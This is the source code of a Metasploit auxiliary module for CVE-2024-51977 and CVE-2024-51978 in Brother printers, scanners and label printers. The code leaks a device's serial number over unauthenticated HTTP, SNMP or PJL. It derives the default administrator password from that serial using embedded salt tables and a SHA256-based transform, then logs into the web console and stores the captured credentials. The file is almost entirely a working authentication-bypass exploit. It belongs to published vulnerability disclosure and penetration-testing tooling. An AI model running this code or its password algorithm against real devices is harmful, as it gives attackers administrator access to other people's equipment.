##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multiple Brother devices authentication bypass via default administrator password generation',
        'Description' => %q{
          By leaking a target devices serial number, a remote attacker can generate the target devices default
          administrator password. The target device may leak its serial number via unauthenticated HTTP, HTTPS, IPP,
          SNMP, or PJL requests.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7' # Discovery, Analysis, Exploit
        ],
        'References' => [
          ['CVE', '2024-51977'], # Serial number info leak via an unauthenticated HTTP/HTTPS/IPP request.
          ['CVE', '2024-51978'], # The authentication bypass
          ['URL', 'https://support.brother.com/g/b/link.aspx?prod=group2&faqid=faq00100846_000'], # Brother Laser and Inkjet Printer Advisory
          ['URL', 'https://support.brother.com/g/b/link.aspx?prod=group2&faqid=faq00100848_000'], # Brother Document Scanner Advisory
          ['URL', 'https://support.brother.com/g/b/link.aspx?prod=lmgroup1&faqid=faqp00100620_000'], # Brother Label Printer Advisory
          ['URL', 'https://www.rapid7.com/blog/post/multiple-brother-devices-multiple-vulnerabilities-fixed'], # Rapid7 disclosure blog
          ['URL', 'https://github.com/sfewer-r7/BrotherVulnerabilities'] # PoC's
        ],
        'DisclosureDate' => '2025-06-25',
        'DefaultOptions' => {
          # A HTTP(S) based port, for either HTTP (TCP 80), HTTPS (TCP 443), or IPP (TCP 631).
          # By default, we choose HTTPS.
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base URI path to the web admin console', '/']),
      OptInt.new('PJL_RPORT', [true, 'The target port number for PJL', 9100]),
      OptInt.new('SNMP_RPORT', [true, 'The target port number for SNMP', 161]),
      OptString.new('SNMP_OID_SERAILNO', [true, 'The SNMP OID for the serial number', '1.3.6.1.2.1.43.5.1.1.17.1'])
    ])

    register_advanced_options([
      OptString.new('TargetSerial', [false, 'A serial number to use for this target. If none is specified, the target will be queried via HTTP, SNMP, or PJL to discover the serial number', nil]),
      OptEnum.new('DiscoverSerialVia', [ true, 'The technique to use to discover the serial number', 'AUTO', %w[AUTO HTTP SNMP PJL] ]),
      OptInt.new('SaltLookupIndex', [true, 'The index into the salt table to use when generating the default password', 254]),
      OptString.new('SaltData', [false, 'The salt data to use when generating the default password', nil]),
      OptBool.new('ValidatePassword', [ true, 'Validate the default password by attempting to login', true ])
    ])
  end

  def run
    # Step 1, we must leak the target devices serial number. We can do this by either an HTTP, SNMP, or PJL query.
    # Alternatively, a user can enter a known serial number via the TargetSerial datastore option.

    serial_number = nil

    if datastore['TargetSerial']
      serial_number = datastore['TargetSerial'].to_s
    else
      case datastore['DiscoverSerialVia']
      when 'AUTO'
        serial_number = get_serial_via_http
        if serial_number.nil?
          serial_number = get_serial_via_snmp
          if serial_number.nil?
            serial_number = get_serial_via_pjl
          end
        end
      when 'HTTP'
        serial_number = get_serial_via_http
      when 'SNMP'
        serial_number = get_serial_via_snmp
      when 'PJL'
        serial_number = get_serial_via_pjl
      else
        fail_with(Failure::BadConfig, "Unknown DiscoverSerialVia option: #{datastore['DiscoverSerialVia']}")
      end
    end

    fail_with(Failure::NotVulnerable, 'Failed to retrieve the target device serial number') unless serial_number

    # Step 2, we transform a serial number into a default admin password using a pseudo hashing algorithm based upon
    # several fixed lookup tables, the SHA256 hashing algorithm, the base64 encoding scheme, and several character
    # transformations.

    default_password = generate_default_password(
      serial_number,
      salt_lookup_index: datastore['SaltLookupIndex'],
      salt_data: datastore['SaltData']&.unpack('C*')
    )

    print_status("Generated default password value: #{default_password}")

    # Step 3, we can verify the password by attempting to log into the target devices web admin interface.
    if datastore['ValidatePassword']
      # NOTE: Some consumer devices are know to use a default admin password of either 'initpass', or 'access'. As this
      # module is specifically testing for CVE-2024-51978 (Affecting models that use a default admin password based upon
      # their serial number), we don't try to validate any other know static password values.
      store_credentials('admin', default_password, validate_password(default_password))
    else
      store_credentials('admin', default_password, Metasploit::Model::Login::Status::UNTRIED)
    end
  end

  # This is CVE-2024-51977
  def get_serial_via_http
    vprint_status('Attempting to leak serial number via HTTP')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'etc', 'mnt_info.csv')
    )

    unless res
      vprint_error('HTTP connection failed')
      return nil
    end

    unless res.code == 200
      vprint_error("Unexpected HTTP response code: #{res.code}")
      return nil
    end

    serial_no_index = nil

    csv = CSV.parse(res.body)

    csv&.each do |row|
      if serial_no_index.nil?
        serial_no_index = row.index('Serial No.')
      else
        print_status("Leaked target serial number via HTTP: #{row[serial_no_index]}")

        return row[serial_no_index]
      end
    end

    nil
  end

  def get_serial_via_pjl
    vprint_status('Attempting to leak serial number via PJL')

    pjl_sock = Rex::Socket::Tcp.create(
      'PeerHost' => datastore['RHOST'],
      'PeerPort' => datastore['PJL_RPORT'],
      'Proxies' => datastore['Proxies'],
      'SSL' => false,
      'Context' => {
        'Msf' => framework,
        'MsfExploit' => self
      }
    )

    pjl = Rex::Proto::PJL::Client.new(pjl_sock)

    pjl.begin_job

    pjl_sock.put("@PJL INFO BRFIRMWARE\n")

    pjl_respose = pjl_sock.get(Rex::Proto::PJL::DEFAULT_TIMEOUT)

    pjl.end_job

    unless pjl_respose
      vprint_error('No PJL response')
      return nil
    end

    if pjl_respose =~ /SERIAL="([a-zA-Z0-9]+)"/

      print_status("Leaked target serial number via PJL: #{Regexp.last_match(1)}")

      return Regexp.last_match(1)
    end

    nil
  rescue Rex::AddressInUse, ::Errno::ECONNRESET, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
    vprint_error("PJL connection failed: #{e.message}")
    return nil
  ensure
    disconnect
  end

  def get_serial_via_snmp
    vprint_status('Attempting to leak serial number via SNMP')

    snmp = connect_snmp(true, { 'RPORT' => datastore['SNMP_RPORT'] })

    res = snmp.get_value(datastore['SNMP_OID_SERAILNO'])

    return nil if res.is_a? SNMP::Null

    print_status("Leaked target serial number via SNMP: #{res}")

    res
  ensure
    disconnect_snmp
  end

  SALT_LOOKUP_TABLE = [
    0x06, 0x1A, 0x80, 0x93, 0x90, 0x60, 0xA4, 0x18, 0x76, 0xA8, 0xFA, 0x98, 0x58, 0x25, 0x5F, 0xBA,
    0x24, 0xCF, 0xDD, 0xB6, 0xD0, 0xE3, 0x7A, 0x68, 0x41, 0x8B, 0x21, 0x15, 0x7E, 0x65, 0x70, 0x7F,
    0x8C, 0x91, 0x3B, 0xFC, 0x13, 0x4A, 0xBE, 0xD7, 0x6C, 0x99, 0xC3, 0xD1, 0x51, 0x35, 0xDF, 0x23,
    0xB0, 0x3F, 0x3D, 0x16, 0x29, 0xA1, 0x59, 0xCA, 0xA2, 0x5C, 0x43, 0x0B, 0xA5, 0x36, 0xF0, 0xFE,
    0x3E, 0xED, 0xF2, 0xE6, 0xEA, 0x54, 0x66, 0x7D, 0xEE, 0x3C, 0x50, 0xEF, 0x9E, 0xD3, 0xB1, 0xF7,
    0xAC, 0x5A, 0x6E, 0x12, 0x2A, 0x01, 0x46, 0x8F, 0x6B, 0x88, 0x0E, 0x52, 0xF9, 0x81, 0xA0, 0x02,
    0xC1, 0xF1, 0xE9, 0xC2, 0xF6, 0x33, 0xCB, 0xB3, 0x73, 0x17, 0xFD, 0x6F, 0xF4, 0xEC, 0x84, 0xC6,
    0x47, 0xCE, 0x9F, 0xD5, 0x92, 0x85, 0x53, 0x26, 0x27, 0x62, 0xEB, 0xAE, 0x3A, 0x1F, 0x0F, 0x94,
    0x95, 0x82, 0x8E, 0x42, 0x28, 0xB9, 0xBF, 0xAF, 0xD4, 0x48, 0xD9, 0xC5, 0x4C, 0x64, 0x2B, 0x8D,
    0xF8, 0xAA, 0xC4, 0x63, 0x87, 0xE4, 0x1D, 0xA6, 0x14, 0xCD, 0xBB, 0xC0, 0xE5, 0xDA, 0x37, 0xC9,
    0xE8, 0xB8, 0x67, 0xDC, 0x5D, 0xA7, 0xAD, 0x79, 0x44, 0xF3, 0x83, 0xA9, 0x1B, 0x96, 0x89, 0xAB,
    0x45, 0xBC, 0x1C, 0xB4, 0xE1, 0x20, 0x2F, 0x49, 0x22, 0x86, 0xDB, 0x4E, 0xE0, 0x9B, 0x10, 0x19,
    0x97, 0x61, 0x40, 0x78, 0x5E, 0x39, 0xCC, 0x0D, 0x09, 0x9D, 0x34, 0x0C, 0x2E, 0x0A, 0x77, 0x6D,
    0xDE, 0xC7, 0xD8, 0xA3, 0xE2, 0x56, 0xB5, 0x4B, 0x38, 0x74, 0x8A, 0xBD, 0x6A, 0x4F, 0x07, 0x03,
    0x05, 0xFF, 0xF5, 0x31, 0x1E, 0xE7, 0xD2, 0x2D, 0x69, 0xC8, 0x5B, 0xD6, 0x57, 0x75, 0x7C, 0xB2,
    0x72, 0xB7, 0x2C, 0xFB, 0x11, 0x9C, 0x7B, 0x32, 0x55, 0x30, 0x71, 0x04, 0x9A, 0x4D, 0x08, 0x100
  ]

  SALT_DATA_TABLE = [
    'aiaFrJAn', 'FuUcjKwa', 'cMnDTitZ', 'RuSfzwJC', 'XXrLDVub', 'znimXRSU', 'dLdJgcZf', 'rgm32u2x',
    '7HOLDhk\'', 'ENbuNZVy', 'eCd6Ygyf', 'gmLt2GuL', '5dhjHet3', 'nPtN7h23', '47rdTTV7', 'KAkaSzWh',
    's3m7wwW2', 'wtBGnGjn', 'H3LyF$dd', 'H6EtSew2', 'D9N8iJBB', 'tPT4ZKm3', 'XEEV4tjf', 'zDXx93rw',
    'HKkmbGjD', 'ng5sLECe', 'QrPVDngu', 'LPMhpZe9', 'uLzhjUwc', 'Sa9QBKW2', 'AfrPdj7y', 'ujmt9s72',
    'n8Y7XrFx', '8xeRU7rW', 'RUzpQznp', '%hU5RMxP', 'ipaZKMEW', 'chP5cHCy', 'b5UJabgU', 'WtZsF7VF',
    'xk8wg669', 'gAVynzbw', 'GuRgNxkm', 'UBCAUb85', 'CQgQhyfp', 'fcEegCtB', '5LSpTNPN', 'dzrQdahF',
    'kD4fHLhM', 'mHQ6QAUg', 'TjZ6kiAb', '5SMdwEK6', 'RD2ytHHH', 'XgQHBfBY', '6ZZRVbHx', 'BNDUsFCC',
    'iSwrrtpr', 'ucBFJbGj', 'Nzs7rhKJ', 'uHugTJX5', 'aXN3FsUF', 'uyHDwwUK', 'tbnJTYje', 'SmgfLZ2n',
    '4sXy9D8j', 'YLVSee68', '3U5TbNNS', 'QjYfTBKu', 'T*8AF8dk', 'F8xQDTrW', 'Pyeda62U', '33sghDrE',
    'ThiW9Naz', 'BU9TDd7k', '72sgwM&G', 'VkV+uSUt', 'HpTdi9jL', 'G3AbGyAH', 'zbW8YCSy', 'eKB25SCe',
    'rbzpCtQN', 'EZSRB966', 'nJAxxUbS', '7GZRAG9E', 'PaMCwYGQ', 'TZy2AeYr', 'jMgYEPUT', '6QAepcUc',
    'jdWU9pXy', 'CeZs6T8g', 'jEEDBNPn', 'fCHg4V5W', 'rTUUjyPG', '3L5SNJhr', 'XbXK4Lg9', 'ZcdGAzLH',
    'ANfMJ&6p', 'S4URfyzc', 'Pai9muCn', 'Nei%6NwR', 'BnUWBHg6', 'FwGyWrux', 'mwkuuGXX', 'WR$LK5Qu',
    'Lxs4DgNM', 'KAYMHcKy', 'UnWYeeUp', '2cc3EzeX', '7nVPpdCd', 'LDPgHa9b', 'Yfwsz7zR', 'tGhb9Ych',
    'Gxi4S8jC', 'QEiWU2cm', 'PFhyTxjN', 'LrpTgGLw', 'PUfziDzE', 'ACbmRneN', 'gYmjyNjF', 'RuZctKSS',
    'k8KdHgDB', 'pJEA3hSG', 'X6rbghrk', '9mnbf3up', '4WU2hMHx', 'TgmNEn45', 'zRnQReEn', 'DfsPzxsX',
    'UyScxhhw', 'knEsS3CX', 'xuPUKwFf', 'Ks4nKt2z', 'trBf!b67', 'rhHgt4gX', '2N8sPf#d', 'eFMjhMcB',
    'aWLeRu9M', '4MiN4D63', '5nG9jMGh', 'SA5pnyQ6', 'UnSQ94nx', 'kPjzBBxy', '6CppHT3R', '3VPgRgiL',
    'cP9JJDJr', 'MyMWzUMj', 'xyG4ACEd', 'dbnAbG8e', 'RnHGYc6F', 'ktCQnJWk', 'XBt5Vxr2', 'wH6iY9f9',
    'atB4eri8', '8SdHujf8', 'inLRdn5s', 'Fh3N*pWc', 'Fb3XYtZz', 'GADACWcS', 'r8tsDgph', 'EumHNmFg',
    'rRFKrK2x', 'TQ9nUnNk', 'P5hss6GX', 'mX8ZSQtr', 'BJMjyd7H', 'EC7r5fEm', 'TPjQpDaa', 'SZeMDpfR',
    'XEDJeraW', 'YYNTgsah', '6uupfWF!', '7RcTLwHX', 'ycYr3dwT', '7VwCnTFQ', 'JGF6iigf', 'M72Kea4f',
    'ZxfZWbVb', 'NcT3LGBV', 'HBU68uaa', 'UeHK4pnf', 'sDjzNHHd', 'CGjgeutc', 'PC4JbuC2', 'tNYQc7Xs',
    'RGNsJQhD', 'HKEh2fba', '49x4PLUz', 'N6MLNkY5', 'NrMHeE9d', 'j5NkznV4', 'n8At3YKi', 'ZnHwAEnZ',
    '3LnUmF8E', 'RBXzdUpA', 'FwGHBVej', '3wkkik7E', 'fpyGnp2u', 'ANBwfiPb', 'Ztt8X9zG', '47K7QWix',
    'TzJfUdNY', 'hpD?MEAm', 'sJRh4Jni', 'TyQUgEEH', 'FBJnWWwx', '7cN3GH6e', 'hWQhzFTN', 'GamDhsgZ',
    'yXM4cZKt', '9BJPKtaC', 'NVNpe4kJ', 'uSyxGxbz', 'h5zTpV3U', 'TAajcQ4h', 'VjYMEusS', 'Wpj237VG',
    'yAjHYVVV', 'Hb6k7Cwe', 'yZbuDBEi', 'S4wpBmZM', 'DwFra8wk', 'j#Pk5r9W', 'PjkfS9WB', 'gHf3YGA3',
    'ihDtdUCu', 'KARzJDfR', 'M7fApB5U', 'MiD44gRC', 'RdEM8y5W', '4GsGuPag', 'pETQc4k2', 'pZZu7Ras',
    'AJReAUBy', 'EAMmQsWe', 'BeC2XJi8', 'PujT2eRf', '2UXLeAJu', 'hMPbY3MQ', 'QeawRP*p', 'SbCbW9Tf',
    'EhNNtLyj', 'B8RjceGs', 'LaydmLeD', 'JFR7T47f', 'WCbAdTfm', 'srN9gNSE', 'gAn7h8Yp', '4PnTKVse',
    'HDxGwLsN', 'tR8XUSRg', 'wLe-3Xf8', 'zH7cpxsd', 'tCc5sWFX', '3hzTj5BS', 'hLK6f&g4', 'tCzzSsm7'
  ]

  def generate_default_password(serial, salt_lookup_index: 254, salt_data: nil)
    fail_with(Failure::BadConfig, 'SaltLookupIndex must be between 0 and 255') unless salt_lookup_index.between?(0, SALT_LOOKUP_TABLE.length - 1)

    unless salt_data && salt_lookup_index != 0
      salt_table_index = SALT_LOOKUP_TABLE[salt_lookup_index]

      fail_with(Failure::BadConfig, "unknown salt table data at salt table index #{salt_table_index}") unless SALT_DATA_TABLE[salt_table_index]

      salt_data ||= SALT_DATA_TABLE[salt_table_index].unpack('C*')
    end

    fail_with(Failure::BadConfig, "SaltData must be 8 bytes, and not #{salt_data.length}") unless salt_data.length == 8

    vprint_status("Generating default password with salt lookup index #{salt_lookup_index} and salt data #{salt_data.pack('C*')}")

    buff = serial[0..15]

    buff << [
      salt_data[7] - 1,
      salt_data[6] - 1,
      salt_data[5] - 1,
      salt_data[4] - 1,
      salt_data[3] - 1,
      salt_data[2] - 1,
      salt_data[1] - 1,
      salt_data[0] - 1
    ].pack('C*')

    hash = Digest::SHA256.digest(buff)

    hash64 = Base64.strict_encode64(hash)

    result = ''

    0.upto(7) do |idx|
      c = hash64[idx]

      case c
      when 'l'
        result << '#'
      when 'I'
        result << '$'
      when 'z'
        result << '%'
      when 'Z'
        result << '&'
      when 'b'
        result << '*'
      when 'q'
        result << '-'
      when 'O'
        result << ':'
      when 'o'
        result << '?'
      when 'v'
        result << '@'
      when 'y'
        result << '>'
      else
        result << c
      end
    end

    result
  end

  def validate_password(password)
    vprint_status("Attempting to validate password '#{password}'")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'general', 'status.html')
    )

    unless res
      vprint_error('HTTP GET connection failed')
      return Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
    end

    unless res.code == 200
      vprint_error("Unexpected HTTP GET response code: #{res.code}")
      return Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
    end

    unless res.body =~ /input type="password" id="LogBox" name="([^"]+)"/
      vprint_error('Failed to extract login form LogBox name. Some models do not have an initial password set. Visit the web interface to examine further.')
      return Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
    end

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'general', 'status.html'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        Regexp.last_match(1) => password,
        'loginurl' => normalize_uri(datastore['TARGETURI'], 'general', 'status.html')
      }
    })

    unless res
      vprint_error('HTTP POST connection failed')
      return Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
    end

    unless res.code == 200 || res.code == 301
      vprint_error("Unexpected HTTP POST response code: #{res.code}")
      return Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
    end

    auth_cookie = res&.get_cookies&.match(%r{AuthCookie=([a-zA-Z0-9%/+=\-\r\n]+);})

    unless auth_cookie
      print_bad("Failed to login with the administrator password: #{password}")
      return Metasploit::Model::Login::Status::DENIED_ACCESS
    end

    print_status("Received an AuthCookie value: #{auth_cookie[1]}")

    print_good("Successfully validated the administrator password: #{password}")

    Metasploit::Model::Login::Status::SUCCESSFUL
  end

  def store_credentials(username, password, login_status)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      private_data: password,
      private_type: :password
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: login_status
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
